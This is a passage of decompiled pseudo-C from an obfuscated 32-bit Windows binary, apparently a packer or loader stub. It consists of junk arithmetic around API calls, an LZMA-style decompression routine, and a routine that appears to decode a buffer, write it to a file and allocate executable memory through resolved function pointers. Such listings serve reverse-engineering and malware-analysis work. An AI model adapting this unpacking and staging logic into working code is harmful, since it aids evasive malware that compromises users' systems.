          v20 = v13 - v19;
          v50 |= 0x4043u;
          v15 = (2 * (v20 + v19)) ^ 0x2B;
          v8 = v20 < 0x40ED;
          v13 = v20 - 16621;
          v21 = v8 + (v49 & v18 | 0x7E66) + 50658;
          if ( v15 == v21 )
            goto LABEL_16;
          v15 += v49;
          v8 = v21 < v49;
          v22 = v21 - v49;
          v13 = (v49 & (v13 - (v8 + v22))) + 143;
          if ( (v15 & 0xEB45) == 0 )
          {
            v23 = v22 - v49;
            v49 = (__PAIR64__(v49, v22) - (v49 | 0xC800000000i64)) >> 32;
            v21 = v23 | 0x54;
LABEL_16:
            v22 = v50 | v21;
            v50 &= 0xDB18u;
            v49 |= 0x3B1Eu;
            v50 -= v13;
          }
          v17 = v15 & v22 | 0x625F;
          v16 = 0;
LABEL_26:
          v31 = v13 + v16 + v13;
          v38 += v31;
          v39 -= v15;
          if ( v17 >= v15 )
          {
            v8 = __PAIR64__(v38, v17) < (v15 | 0x5400000000ui64);
            v38 = (__PAIR64__(v38, v17) - (v15 | 0x5400000000i64)) >> 32;
            v32 = v8 + v17;
            v8 = v38 < v32;
            v38 -= v32;
            v40 += v17 + v8;
            v38 -= 23366;
          }
          v33 = v17 ^ v31;
          v38 = 195 - v33;
          v40 = 128;
          v34 = v33 ^ v15;
          v1 = 6904;
          v35 = (195 - v33) & v33;
          v38 -= v35;
          v38 += v35;
          v38 ^= v35;
          v38 ^= 0x1AF8u;
          v3 = v39 & v35 & (v34 | 0x1AF8);
          v2 = ++v58;
          if ( v58 >= a1 )
            return v61;
          break;
        case 5:
          v17 = 0;
          v13 = -46479;
          v48 = 146;
          v16 = 1;
          v15 = -62;
          goto LABEL_26;
        default:
          v45 = -127159273;
          GetCurrentProcess();
          v26 = __CFADD__(v25 | 0x2700000000i64, __PAIR64__(v25, v45));
          v27 = (v25 | 0x2700000000i64) + __PAIR64__(v25, v45);
          v45 += v25;
          if ( (v26 ? v47 : 0) != 0 )
          {
            v45 ^= 0x770Au;
            v47 &= HIDWORD(v27);
            v44 |= (v24 + v26) | 0x31;
            v47 += 102;
          }
          v47 -= 6;
          v28 = GetVersionExA(&VersionInformation) | 0x42C7;
          v47 |= v29;
          v8 = v44 < v29;
          v44 -= v29;
          v45 += v8 + 25014;
          v46 |= 0xAEBCu;
          if ( v45 == v28 )
          {
            v30 = v44 + (v45 < v28) + v28;
            v44 &= v30;
            v44 ^= v30 + 54250;
          }
          v47 = -110077461;
          v43 = 196;
          v42[2] = (int)&v43;
          v46 = -558768;
          v42[1] = (int)&v46;
          ++v45;
          v43 += 11892;
          v47 -= 9018;
          v47 ^= 1u;
          v45 += 109;
          v43 ^= 0x8Fu;
          GetCurrentProcess();
          v61 ^= v59;
          v17 = (unsigned int)v42;
          v41 = v42;
          v13 = (int)v42;
          v15 = 451621458;
          v16 = 0;
          v42[0] = 451621458;
          goto LABEL_26;
      }
    }
  }
  return v61;
}
// 4032E0: variable 'v8' is possibly undefined
// 403519: variable 'v25' is possibly undefined
// 40352A: variable 'v24' is possibly undefined
// 403567: variable 'v29' is possibly undefined

//----- (004038BE) --------------------------------------------------------
unsigned int __fastcall sub_4038BE(int a1, int a2, int a3)
{
  int v3; // edx
  __int16 v4; // cx
  int v5; // eax
  int v6; // edx
  unsigned int v7; // kr00_4
  int v8; // ecx
  unsigned int v9; // edx
  bool v10; // cf
  unsigned int result; // eax
  int v12; // ecx
  unsigned int v13; // edx
  unsigned int v14; // eax
  struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-C0h] BYREF
  int i; // [esp+98h] [ebp-28h]
  int *v17; // [esp+9Ch] [ebp-24h]
  int *v18; // [esp+A0h] [ebp-20h]
  unsigned int v19; // [esp+A4h] [ebp-1Ch]
  int v20[2]; // [esp+A8h] [ebp-18h] BYREF
  unsigned int v21; // [esp+B0h] [ebp-10h]
  unsigned int v22; // [esp+B4h] [ebp-Ch]
  int v23; // [esp+B8h] [ebp-8h]
  int v24; // [esp+BCh] [ebp-4h]
  int v25; // [esp+C8h] [ebp+8h]
  int v26; // [esp+C8h] [ebp+8h]

  v19 = 61184;
  if ( (v20[1] | a1) != a2 - a1 - 36740 )
    v23 -= 429;
  v22 -= 237;
  GetLastError();
  if ( (((_WORD)v3 + v10 + v4) & 0x3412) == 0 )
    v23 += v3;
  v19 |= 0x9A48u;
  v20[0] = -122049696;
  v18 = v20;
  v21 = -122049696 - v19;
  v23 = 55;
  v5 = (int)((-122049696 - v19) & 0xF7FF1072) / 56;
  v6 = (int)((-122049696 - v19) & 0xF7FF1072) % 56;
  v24 = v5;
  v10 = __CFADD__(__PAIR64__(v5, v22), __PAIR64__(v19, v6));
  v7 = v22 + v6;
  v19 = (__PAIR64__(v19, v22) + __PAIR64__(v5, v6)) >> 32;
  v25 = -134279054 - (v10 + v22 + v6);
  if ( ((v22 + v6) & 0x38) == 0 )
  {
    v22 ^= v5;
    if ( v7 + 78 < 0x5BF8 )
      goto LABEL_9;
    v22 = (__PAIR64__(v22, v5) - 0xE7C0000036B2i64) >> 32;
  }
  v25 |= 0x37u;
LABEL_9:
  v21 ^= 0xA1Cu;
  v17 = v20;
  v8 = v19 & 0x4F20;
  v26 = v20[0] - v8 + v25;
  v9 = v23 & (v20[0] - v8);
  if ( (v8 & v9) != 0 )
  {
LABEL_12:
    v22 += 62004;
    goto LABEL_13;
  }
  v22 += 187;
  if ( (v9 & v8) <= v9 )
  {
    v19 |= v9;
    goto LABEL_12;
  }
LABEL_13:
  for ( i = 0; i < 3; ++i )
  {
    result = GetVersionExA(&VersionInformation);
    if ( (result & v22) == 0 )
    {
      v13 = v22 + v22 - v10;
      v22 ^= result;
      v14 = v22 ^ result ^ 0xB7BB;
      if ( v12 != v26 )
      {
        v22 -= v14;
        v23 -= v14;
        v24 -= v14;
      }
      v20[0] |= 0x7999u;
      result = v21 + (v13 ^ v14);
    }
    v19 &= 0xB0u;
    v19 += 98;
  }
  return result;
}
// 403922: variable 'v3' is possibly undefined
// 403922: variable 'v10' is possibly undefined
// 403922: variable 'v4' is possibly undefined
// 403A3F: variable 'v12' is possibly undefined

//----- (00403AA7) --------------------------------------------------------
HANDLE __stdcall sub_403AA7(int a1)
{
  DWORD TickCount; // eax
  int v2; // edx
  int v3; // ecx
  int v4; // ecx
  DWORD LastError; // eax
  unsigned int v6; // edx
  int v7; // ecx
  unsigned int v8; // ecx
  unsigned int v9; // eax
  bool v10; // cf
  DWORD v11; // edx
  unsigned int v12; // ecx
  unsigned int v13; // edx
  int v14; // ett
  DWORD CurrentThreadId; // eax
  unsigned int v16; // ecx
  unsigned int v17; // ecx
  char *v18; // edx
  unsigned int v19; // edx
  int Version; // eax
  int v21; // ecx
  int v22; // ecx
  __int16 v23; // dx
  int v24; // edx
  signed int v25; // eax
  BOOL v26; // ett
  int v27; // edx
  HANDLE result; // eax
  struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-FCh] BYREF
  int *v30; // [esp+94h] [ebp-68h]
  int m; // [esp+9Ch] [ebp-60h]
  int v32; // [esp+A8h] [ebp-54h]
  int k; // [esp+B0h] [ebp-4Ch]
  int v34; // [esp+B8h] [ebp-44h]
  int v35; // [esp+BCh] [ebp-40h]
  int j; // [esp+C0h] [ebp-3Ch]
  int *v37; // [esp+C4h] [ebp-38h]
  unsigned int *v38; // [esp+C8h] [ebp-34h]
  int *v39; // [esp+CCh] [ebp-30h]
  int i; // [esp+D0h] [ebp-2Ch]
  int *v41; // [esp+D4h] [ebp-28h]
  unsigned int v42; // [esp+D8h] [ebp-24h]
  int v43; // [esp+DCh] [ebp-20h] BYREF
  unsigned int v44; // [esp+E0h] [ebp-1Ch]
  unsigned int v45; // [esp+E4h] [ebp-18h] BYREF
  int v46; // [esp+E8h] [ebp-14h] BYREF
  signed int v47; // [esp+ECh] [ebp-10h]
  unsigned int v48; // [esp+F0h] [ebp-Ch] BYREF
  unsigned int v49; // [esp+F4h] [ebp-8h]
  int v50; // [esp+F8h] [ebp-4h] BYREF
  int v51; // [esp+104h] [ebp+8h]

  TickCount = GetTickCount();
  v4 = v3 - (v10 + v49);
  if ( (v4 & v47) != 0 )
  {
    v47 &= v2 | 0x3C4A;
    v48 |= TickCount;
  }
  v46 += v4;
  v43 = 113;
  v51 = 104;
  v41 = &v43;
  v47 = 9;
  for ( i = 0; i < 4; ++i )
  {
    v50 = 246;
    v44 = 284143320;
  }
  LastError = GetLastError();
  v8 = v47 | v7;
  v9 = v45 + LastError;
  v10 = v9 < v6;
  if ( v9 != v6 )
  {
    v11 = v9 + v6;
    v10 = __CFADD__(v9, v8);
    v12 = v9 + v8;
    v43 += v12 + v10;
    v45 |= v12;
    v49 &= 0x90u;
    v44 |= 0x7836u;
    v9 ^= 0x68u;
    v46 -= v11;
    v10 = 0;
  }
  v44 += v10 + 172;
  v50 += v9;
  v46 = 15854;
  v39 = &v46;
  v42 = 15854 * v47;
  v13 = -((unsigned __int64)(15854i64 * v47) >> 32 != 0);
  if ( is_mul_ok(0x3DEEu, v47) )
  {
    v43 += 45009;
    if ( (v13 & v50) != 0 )
      goto LABEL_11;
    v49 += (v13 < v48) + 52550;
    v14 = ((v49 | 0xF57000000000ui64) + 169) >> 32;
    v49 += 169;
    v43 -= v14;
  }
  v47 -= 33909;
LABEL_11:
  CurrentThreadId = GetCurrentThreadId();
  v45 ^= 0x269u;
  if ( (CurrentThreadId & v44) == 0 )
  {
    v42 = (__PAIR64__(v42, CurrentThreadId) + 0x1B00000091i64) >> 32;
    v50 += CurrentThreadId + 145;
    if ( v16 >= v45 )
    {
      v44 ^= CurrentThreadId + 145;
      v51 = 174 - v16;
      v49 += v16;
    }
    CurrentThreadId += 25;
    v50 |= 0x793Bu;
  }
  v44 += CurrentThreadId;
  v48 = 64;
  v38 = &v48;
  v45 = 64 - (v46 | 0x6F28);
  v50 = 39184;
  v37 = &v50;
  v17 = v42 + 39184;
  v43 -= v42 + 39184;
  if ( ((v42 + 39184) & v44 & 0x80000000) == 0 )
  {
    v18 = (char *)&v50 - v48;
    v44 -= (unsigned int)&v50 - v48;
    v17 = ((unsigned int)&v50 + v17) | 0xCD74;
    if ( (((unsigned int)&v50 - v48) & v17 & 0x80000000) == 0 )
    {
      v17 += v42;
      v18 = (char *)((__PAIR64__(((unsigned int)&v50 - v48) & 0x40DC, v44) + 0xD1A100000096i64) >> 32);
      v44 += 150;
    }
    v44 += v17;
    v46 &= 0x7C0u;
    v48 |= (unsigned int)&v18[-v42];
  }
  v46 &= v17;
  for ( j = 0; j < 5; ++j )
  {
    v44 = 13389;
    v19 = v51 * ((v45 & 0x344D) - v47);
    v51 = v19;
    if ( (v17 & v34) == 0 )
    {
      v48 ^= v19 - v34;
      if ( (v17 & 0xD9E) == 0 )
      {
        v49 -= 46733;
        v35 ^= v17;
      }
    }
    Version = GetVersionExA(&VersionInformation);
    v22 = v48 | v21;
    v45 &= 0x4Du;
    if ( (v23 & 0x54A0) != 0 )
    {
      v22 |= 0xE9C6u;
      v34 -= Version;
      v34 ^= 0x2527u;
    }
    v46 -= 11510;
    v46 ^= v22;
    for ( k = 0; k < 2; ++k )
    {
      v32 = 82;
      v35 = 222;
      v47 += v43 + 222;
      CreateEventA(0, 0, 1, 0);
      for ( m = 0; m < 3; ++m )
      {
        GetCurrentProcess();
        v30 = (int *)&v45;
        v24 = (int)(v51 & v45) % (v43 + 1);
        v10 = (unsigned __int64)(v43 * (__int64)((int)(v51 & v45) / (v43 + 1))) >> 32 != 0;
        v43 *= (int)(v51 & v45) / (v43 + 1);
        v25 = v43;
        v26 = v10;
        v10 = __CFADD__(v10, v48) | __CFADD__(v24, v10 + v48);
        v48 += v24 + v26;
        v43 -= v10 + v24;
        if ( v47 >= v25 )
        {
          v43 |= v24;
          v27 = v24 + 138;
          if ( (v45 & 0x80000000) == 0 )
          {
            v25 |= 0x51C3u;
            v45 ^= v25;
            v51 ^= v27;
          }
          v48 -= 45;
          v45 -= 40592;
          v35 &= v25;
        }
        v50 -= v47 * v47;
      }
      result = CreateMutexA(0, 0, 0);
    }
  }
  return result;
}
// 403AB6: variable 'v3' is possibly undefined
// 403AB6: variable 'v10' is possibly undefined
// 403ABE: variable 'v2' is possibly undefined
// 403B1D: variable 'v7' is possibly undefined
// 403B23: variable 'v6' is possibly undefined
// 403BF2: variable 'v16' is possibly undefined
// 403CBA: variable 'v17' is possibly undefined
// 403D05: variable 'v21' is possibly undefined
// 403D0C: variable 'v23' is possibly undefined

//----- (00403F42) --------------------------------------------------------
_BYTE *__cdecl sub_403F42(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // eax
  char v3; // cl

  result = a1;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  return result;
}

//----- (00404033) --------------------------------------------------------
void sub_404033()
{
  JUMPOUT(0x404EF2);
}
// 40711A: control flows out of bounds to 404EF2

//----- (00404205) --------------------------------------------------------
unsigned __int8 __cdecl sub_404205(int a1, int a2, _BYTE *a3, unsigned int a4)
{
  char v5[260]; // [esp+8h] [ebp-104h] BYREF

  sub_404D91(a1, a2, v5);
  return sub_406FE5(a3, a4, (int)v5);
}

//----- (004045C7) --------------------------------------------------------
int __usercall sub_4045C7@<eax>(int a1@<esi>)
{
  int v1; // eax
  char v2; // dl
  __int16 v3; // dx
  int v4; // ecx
  _BYTE *v5; // edi
  int v6; // edx
  bool v7; // cf
  int v8; // ecx
  int v9; // ecx
  _BYTE *v10; // edi
  int v11; // esi
  _BYTE *v12; // edi
  int result; // eax
  int v14; // edx
  int v15; // ecx
  int v16; // edx
  int v17; // ecx
  _BYTE *v18; // esi
  int v19; // edx
  char *v20; // edi
  int v21; // eax
  int v22; // ebx
  int v23; // edi
  int v24; // ebx
  int v25; // edx
  int v26; // ecx
  int v27; // ecx
  int v28; // esi
  int v29; // ecx
  __int64 v30; // rcx
  __int64 v31; // rax
  int v32; // esi
  int v33; // eax
  int v34; // esi
  int v35; // ebx
  int v36; // ebx
  int (__stdcall *v37)(_DWORD, _DWORD, _DWORD, _DWORD); // eax
  int v38; // ebx
  int (__fastcall *v39)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // eax
  int v40; // eax
  int v41; // [esp-8h] [ebp-8h]
  int v42; // [esp-4h] [ebp-4h]

  v9 = 0x2000;
  v10 = &unk_4234DC;
  dword_4448CD -= a1;
  do
  {
    v34 = a1 - MEMORY[0x4461CD];
    v42 = v9;
    v1 = sub_4056AA(v34);
    *v10++ = v1;
    LOBYTE(dword_44490D) = dword_44490D - 98;
    a1 = 20579 - (__CFADD__(v2, -121) + v1);
    LOBYTE(dword_4448DD) = 54;
    v9 = v42 - 1;
  }
  while ( v42 != 1 );
  dword_443124(v9 - *(_DWORD *)((char *)&byte_4453D2 + 443), 31945, 255, &unk_4233DC);
  v17 = v16 - 1;
  byte_4448D5 -= 76;
  LOBYTE(v17) = *(&byte_4453D2 + 195);
  dword_4431C8(v17, &unk_4233DC, &unk_44314C, 0, &unk_4232DD);
  LOBYTE(dword_444911) = -110;
  v29 = *(_DWORD *)((char *)&byte_4453D2 + 2927);
  BYTE1(v29) = MEMORY[0x44605D];
  v40 = dword_4431A8(v29, &unk_4232DD, -1073741824, 1, 0, 2, 32, 0);
  v6 = *(_DWORD *)((char *)&byte_4453D2 + 1935);
  LOBYTE(v6) = MEMORY[0x446299];
  dword_4448E1 -= v6;
  dword_4431FC(v40, &unk_4234DC, 0x2000, &dword_443198, 0, v40);
  LOBYTE(dword_4448ED) = dword_4448ED - 21;
  LOBYTE(dword_44490D) = 92;
  dword_443168(v27);
  v4 = 0x2000;
  v5 = &unk_4234DC;
  do
  {
    v41 = v4;
    *v5++ = sub_4056AA(37920);
    v35 = 8069;
    v4 = v41 - 1;
  }
  while ( v41 != 1 );
  BYTE1(v35) = (unsigned __int16)(v41 - 1) >> 8;
  v36 = v35 + 19375;
  dword_44490D = 19635;
  sub_404033();
  dword_443198 = v37;
  BYTE1(v36) -= *(&byte_4453D2 + 3063);
  v38 = v36 - 1 - ((((unsigned int)&v5[*(_DWORD *)((char *)&byte_445152 + 463)] | 0x336E00000000ui64) + 1124) >> 32);
  sub_404033();
  dword_444915 = v38;
  dword_443194 = v39;
  LOBYTE(dword_4448E5) = dword_4448E5 - 36;
  result = dword_443198(0, 0x2000, 12288, 64);
  if ( result )
  {
    dword_44317C = result;
    dword_444901 += v14 + 19952;
    dword_4448E5 = v15 + 21692;
    v28 = (__PAIR64__(dword_444B41 + 2875, dword_4448F5)
         - (((__PAIR64__(
                *(unsigned int *)((char *)&byte_4453D2 + 2931),
                (*(&byte_445001 + 4) + *(_DWORD *)((char *)&byte_4453D2 + 1975) + v38 + 12216) | 0x57E3u)
            - (*(unsigned int *)((char *)&byte_4453D2 + 2619) | 0x221800000000i64)) >> 32) | 0x11C000000000i64)) >> 32;
    dword_4448F5 -= (__PAIR64__(
                       *(unsigned int *)((char *)&byte_4453D2 + 2931),
                       (*(&byte_445001 + 4) + *(_DWORD *)((char *)&byte_4453D2 + 1975) + v38 + 12216) | 0x57E3u)
                   - (*(unsigned int *)((char *)&byte_4453D2 + 2619) | 0x221800000000i64)) >> 32;
    HIDWORD(v30) = v28;
    v31 = dword_4431A8(v15 + 21692, &unk_4232DD, -1073741824, 1, 0, 3, 0, 0);
    dword_444915 = 10503;
    HIDWORD(v30) = (v30 - __PAIR64__(v31, (unsigned int)__CFADD__(v28, 29587) + 10305)) >> 32;
    v32 = dword_444C49 + v28 + 29587;
    v33 = dword_4431D4(HIDWORD(v31), v31, dword_44317C, 0x2000, &unk_4233DC, 0, v31);
    dword_443168(v33);
    dword_44312C(v30 - MEMORY[0x4463F1], 5748, &unk_4232DD);
    v8 = 0x2000;
    HIDWORD(v30) = ((__PAIR64__(
                       HIDWORD(v30) - *(_DWORD *)((char *)&byte_445152 + 227),
                       *(unsigned int *)((char *)&byte_4453D2 + 2731))
                   - __PAIR64__(v32, (unsigned int)v7 + 17254)) >> 32) ^ 0x508E;
    v18 = (_BYTE *)dword_44317C;
    HIDWORD(v30) -= MEMORY[0x446175];
    dword_4448FD = *(_DWORD *)((char *)&byte_4453D2 + 2071);
    BYTE5(v30) = byte_4449F1;
    v19 = 0;
    v7 = HIDWORD(v30) < *(_DWORD *)((char *)&byte_4453D2 + 2647);
    v22 = HIDWORD(v30) - *(_DWORD *)((char *)&byte_4453D2 + 2647);
    v20 = (char *)&byte_4453D2 + v7 + 14287;
    dword_444901 = 8084;
    v21 = 0;
    LOBYTE(v22) = v22 + 78;
    v7 = BYTE1(v22) < MEMORY[0x4460F1];
    BYTE1(v22) -= MEMORY[0x4460F1];
    v23 = (int)&v20[v7 + 30432];
    do
    {
      HIWORD(v24) = (((unsigned int)v23 | 0x6DD300000000i64) + __PAIR64__(v22 - 11661, dword_4448E1)) >> 48;
      dword_4448E1 += v23;
      LOBYTE(v21) = *v18++;
      LOBYTE(v24) = *(&byte_4453D2 + 2099);
      BYTE1(v24) = -45;
      v19 += v21;
      dword_4448DD -= 19512;
      v21 = 0;
      v22 = 13678 - *(_DWORD *)((char *)&byte_4453D2 + 2755) + v24;
      v23 = *(_DWORD *)((char *)&byte_445152 + 211);
      dword_4448FD = v22;
      --v8;
    }
    while ( v8 );
    v25 = v19 ^ 0x4C68;
    v11 = 29762;
    LOBYTE(v25) = *(&byte_445001 + 204) + v25;
    dword_443194(17664 - ((_DWORD)&byte_445152 + 535), v25, dword_44317C, 0, 0x8000);
    result = 0;
    v26 = 0x2000;
    v12 = &unk_4234DC;
    HIBYTE(v3) = *(&byte_4453D2 + 2544);
    do
    {
      v11 += *(_DWORD *)((char *)&byte_445152 + 111);
      *v12++ = 0;
      v3 = HIBYTE(v3) + 243;
      --v26;
    }
    while ( v26 );
  }
  return result;
}
// 4068FA: conditional instruction was optimized away because %0x18.4==1
// 403E26: variable 'v2' is possibly undefined
// 404BF0: variable 'v16' is possibly undefined
// 405C3C: variable 'v27' is possibly undefined
// 405DE8: variable 'v14' is possibly undefined
// 405F57: variable 'v15' is possibly undefined
// 406552: variable 'v30' is possibly undefined
// 404358: variable 'v7' is possibly undefined
// 40692D: variable 'v37' is possibly undefined
// 406D7C: variable 'v39' is possibly undefined
// 443124: using guessed type int (__fastcall *dword_443124)(_DWORD, _DWORD, _DWORD, _DWORD);
// 44312C: using guessed type int (__fastcall *dword_44312C)(_DWORD, _DWORD, _DWORD);
// 443168: using guessed type int (__thiscall *dword_443168)(_DWORD);
// 44317C: using guessed type int dword_44317C;
// 443194: using guessed type int (__fastcall *dword_443194)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 443198: using guessed type int (__stdcall *dword_443198)(_DWORD, _DWORD, _DWORD, _DWORD);
// 4431A8: using guessed type __int64 (__thiscall *dword_4431A8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4431C8: using guessed type int (__thiscall *dword_4431C8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4431D4: using guessed type int (__thiscall *dword_4431D4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4431FC: using guessed type int (__stdcall *dword_4431FC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4448CD: using guessed type int dword_4448CD;
// 4448D5: using guessed type char byte_4448D5;
// 4448DD: using guessed type int dword_4448DD;
// 4448E1: using guessed type int dword_4448E1;
// 4448E5: using guessed type int dword_4448E5;
// 4448ED: using guessed type int dword_4448ED;
// 4448F5: using guessed type int dword_4448F5;
// 4448FD: using guessed type int dword_4448FD;
// 444901: using guessed type int dword_444901;
// 44490D: using guessed type int dword_44490D;
// 444911: using guessed type int dword_444911;
// 444915: using guessed type int dword_444915;
// 4449F1: using guessed type char byte_4449F1;
// 444B41: using guessed type int dword_444B41;
// 444C49: using guessed type int dword_444C49;

//----- (00404658) --------------------------------------------------------
int __usercall sub_404658@<eax>(void *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int result; // eax

  BYTE1(a2) ^= 0xCBu;
  dword_4448F1 += a2;
  LOBYTE(dword_444915) = dword_444915 + 14;
  dword_4448E9 = 11258;
  dword_4448ED -= a3;
  sub_405341(0x4A43u, a1, &unk_41E575);
  sub_405341(0xF799u, a1, dword_4071E0);
  sub_405341(0x6304u, a1, byte_416EA5);
  return result;
}
// 4071E0: using guessed type int dword_4071E0[7];
// 4448E9: using guessed type int dword_4448E9;
// 4448ED: using guessed type int dword_4448ED;
// 4448F1: using guessed type int dword_4448F1;
// 444915: using guessed type int dword_444915;

//----- (004049BB) --------------------------------------------------------
void __usercall sub_4049BB(char a1@<cf>, int a2@<eax>, int a3@<esi>)
{
  if ( !a1 )
  {
    *(_BYTE *)(a2 + 2 * a3 - 127) = 0;
    JUMPOUT(0x404998);
  }
  JUMPOUT(0x406170);
}
// 404996: control flows out of bounds to 404998
// 4049BF: control flows out of bounds to 406170

//----- (00404A06) --------------------------------------------------------
int __stdcall sub_404A06(int a1, unsigned __int8 *a2, unsigned int *a3)
{
  unsigned int v3; // esi
  int v4; // edx
  int v5; // ebx
  unsigned int v6; // ecx
  unsigned int v7; // edx
  unsigned int v8; // ecx
  unsigned int v9; // edi
  unsigned int v10; // eax
  unsigned int v11; // edi
  int v12; // ecx
  unsigned int v13; // ecx
  unsigned int v14; // ebx
  unsigned int v15; // ecx
  unsigned int v16; // edx
  int v17; // esi
  unsigned int *v18; // edi
  unsigned int v19; // eax
  unsigned int v20; // eax
  unsigned int *v21; // edx
  int v22; // ecx
  unsigned int v23; // edx
  unsigned int v24; // edi
  int v25; // ecx
  unsigned int v26; // eax
  int v27; // edx
  int v28; // ebx
  unsigned __int8 *v29; // ecx
  int v30; // edx
  unsigned int *v31; // edi
  unsigned int v32; // edi
  int v33; // esi
  unsigned int v34; // edx
  int v35; // ecx
  int v36; // edx
  unsigned int v37; // edi
  int v38; // ecx
  unsigned int v39; // eax
  int v40; // ecx
  int v41; // ecx
  unsigned int *v42; // ecx
  int v43; // ebx
  unsigned __int8 v44; // dl
  int v45; // esi
  unsigned int *v46; // edx
  int v47; // ecx
  int v48; // edx
  unsigned int v49; // ecx
  unsigned int v50; // edx
  unsigned int v51; // esi
  unsigned int v52; // eax
  unsigned int *v53; // edi
  unsigned int v54; // ecx
  unsigned int v55; // edi
  int v56; // ecx
  unsigned int v57; // eax
  unsigned int v58; // ecx
  int v59; // edx
  int v60; // edi
  unsigned int v61; // ecx
  unsigned int v62; // esi
  int v63; // edi
  int v64; // esi
  unsigned int *v65; // edx
  int v66; // edx
  unsigned int v67; // eax
  int v68; // edi
  int v69; // ecx
  int v70; // esi
  unsigned int *v72; // edi
  unsigned int v73; // ecx
  unsigned int v74; // edi
  int v75; // ecx
  unsigned int *v76; // edi
  int v77; // ecx
  int v78; // ecx
  unsigned int v79; // ecx
  unsigned int v80; // edi
  int v81; // edx
  int v82; // esi
  int v83; // [esp+4h] [ebp-2Ch]
  int v84; // [esp+4h] [ebp-2Ch]
  unsigned int *v85; // [esp+4h] [ebp-2Ch]
  int v86; // [esp+8h] [ebp-28h]
  int v87; // [esp+Ch] [ebp-24h]
  __int16 v88; // [esp+Ch] [ebp-24h]
  unsigned int *v89; // [esp+10h] [ebp-20h]
  int v90; // [esp+10h] [ebp-20h]
  int v91; // [esp+14h] [ebp-1Ch]
  int v92; // [esp+18h] [ebp-18h]
  int v93; // [esp+1Ch] [ebp-14h]
  int v94; // [esp+20h] [ebp-10h]
  int v95; // [esp+24h] [ebp-Ch]
  unsigned __int8 v97; // [esp+2Fh] [ebp-1h]
  unsigned int v98; // [esp+3Ch] [ebp+Ch]

  v93 = 1;
  v91 = 1;
  v92 = 1;
  v86 = 1;
  memset32(a3, 1024, 0x30736u);
  v94 = 0;
  v97 = 0;
  v95 = 0;
  v98 = 0;
  v39 = -1;
  v40 = 5;
  do
  {
    v36 = *a2++ | (v98 << 8);
    --v40;
    v98 = v36;
  }
  while ( v40 );
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v33 = v94 & 3;
        v76 = &a3[16 * v95 + v33];
        if ( v39 < 0x1000000 )
        {
          v77 = *a2 | (v98 << 8);
          v39 <<= 8;
          ++a2;
          v98 = v77;
        }
        v13 = *v76;
        v14 = *v76 * (v39 >> 11);
        if ( v98 >= v14 )
          break;
        *v76 = v13 + ((2048 - v13) >> 5);
        v4 = 1;
        v39 = v14;
        v89 = &a3[768 * v97 + 1846];
        if ( v95 >= 7 )
        {
          v88 = *(unsigned __int8 *)(v94 - v93 + a1);
          while ( 1 )
          {
            v88 *= 2;
            v82 = v88 & 0x100;
            v85 = &v89[v82 + 256 + v4];
            if ( v39 < 0x1000000 )
            {
              v60 = *a2 | (v98 << 8);
              v39 <<= 8;
              ++a2;
              v98 = v60;
            }
            v73 = v89[v82 + 256 + v4];
            v74 = v73 * (v39 >> 11);
            if ( v98 >= v74 )
            {
              v98 -= v74;
              v39 -= v74;
              *v85 = v73 - (v73 >> 5);
              v4 = 2 * v4 + 1;
              if ( (v88 & 0x100) == 0 )
                goto LABEL_30;
            }
            else
            {
              v39 = v73 * (v39 >> 11);
              v4 *= 2;
              *v85 = v73 + ((2048 - v73) >> 5);
              if ( (v88 & 0x100) != 0 )
                goto LABEL_30;
            }
            if ( v4 >= 256 )
              goto LABEL_92;
          }
        }
        do
        {
          v72 = &v89[v4];
          if ( v39 < 0x1000000 )
          {
            v64 = *a2;
            v39 <<= 8;
            ++a2;
            v98 = v64 | (v98 << 8);
          }
          v61 = *v72;
          v62 = *v72 * (v39 >> 11);
          if ( v98 >= v62 )
          {
            v98 -= v62;
            v39 -= v62;
            *v72 = v61 - (v61 >> 5);
            v4 = 2 * v4 + 1;
          }
          else
          {
            v39 = *v72 * (v39 >> 11);
            *v72 = v61 + ((2048 - v61) >> 5);
            v4 *= 2;
          }
LABEL_30:
          ;
        }
        while ( v4 < 256 );
LABEL_92:
        v70 = v94++;
        v97 = v4;
        *(_BYTE *)(v70 + a1) = v4;
        if ( v95 >= 4 )
        {
          if ( v95 >= 10 )
            v95 -= 6;
          else
            v95 -= 3;
        }
        else
        {
          v95 = 0;
        }
      }
      v98 -= v14;
      v49 = v13 - (v13 >> 5);
      v19 = v39 - v14;
      *v76 = v49;
      v65 = &a3[v95 + 192];
      if ( v19 < 0x1000000 )
      {
        v47 = *a2 | (v98 << 8);
        v19 <<= 8;
        ++a2;
        v98 = v47;
      }
      v79 = *v65;
      v80 = *v65 * (v19 >> 11);
      if ( v98 < v80 )
        break;
      v98 -= v80;
      v26 = v19 - v80;
      *v65 = v79 - (v79 >> 5);
      v31 = &a3[v95 + 204];
      if ( v26 < 0x1000000 )
      {
        v78 = *a2 | (v98 << 8);
        v26 <<= 8;
        ++a2;
        v98 = v78;
      }
      v6 = *v31;
      v7 = *v31 * (v26 >> 11);
      if ( v98 >= v7 )
      {
        v98 -= v7;
        v57 = v26 - v7;
        *v31 = v6 - (v6 >> 5);
        v46 = &a3[v95 + 216];
        if ( v57 < 0x1000000 )
        {
          v56 = *a2 | (v98 << 8);
          v57 <<= 8;
          ++a2;
          v98 = v56;
        }
        v54 = *v46;
        v55 = *v46 * (v57 >> 11);
        if ( v98 >= v55 )
        {
          v98 -= v55;
          v20 = v57 - v55;
          *v46 = v54 - (v54 >> 5);
          v21 = &a3[v95 + 228];
          if ( v20 < 0x1000000 )
          {
            v22 = *a2 | (v98 << 8);
            v20 <<= 8;
            ++a2;
            v98 = v22;
          }
          v8 = *v21;
          v9 = *v21 * (v20 >> 11);
          if ( v98 >= v9 )
          {
            v98 -= v9;
            v10 = v20 - v9;
            *v21 = v8 - (v8 >> 5);
            v12 = v86;
            v86 = v92;
          }
          else
          {
